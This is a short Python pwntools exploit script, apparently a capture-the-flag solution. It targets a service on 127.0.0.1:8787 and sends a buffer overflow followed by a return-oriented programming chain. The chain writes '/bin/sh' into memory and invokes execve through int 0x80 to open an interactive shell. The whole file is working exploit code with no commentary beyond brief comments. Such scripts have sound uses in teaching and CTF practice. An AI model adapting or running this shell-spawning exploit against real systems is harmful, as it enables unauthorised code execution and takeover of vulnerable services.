#!/usr/bin/env python
from pwn import *

r = remote("127.0.0.1", 8787)

buf = 0x80ea060
mov_edx_eax = 0x0809a15d
pop_edx = 0x0806e82a
pop_eax = 0x080bae06
pop_edx_ecx_ebx = 0x0806e850
int_0x80 = 0x080493e1

payload = "a"*32

#execve("/bin/sh",NULL,NULL)
#write word to memory
payload += flat([pop_edx,buf,pop_eax,"/bin",mov_edx_eax])
payload += flat([pop_edx,buf+4,pop_eax,"/sh\x00",mov_edx_eax])
#write value to registers
payload += flat([pop_edx_ecx_ebx,0,0,buf,pop_eax,0xb,int_0x80])
print len(payload)
r.recvuntil(":")
r.sendline(payload)
r.interactive()

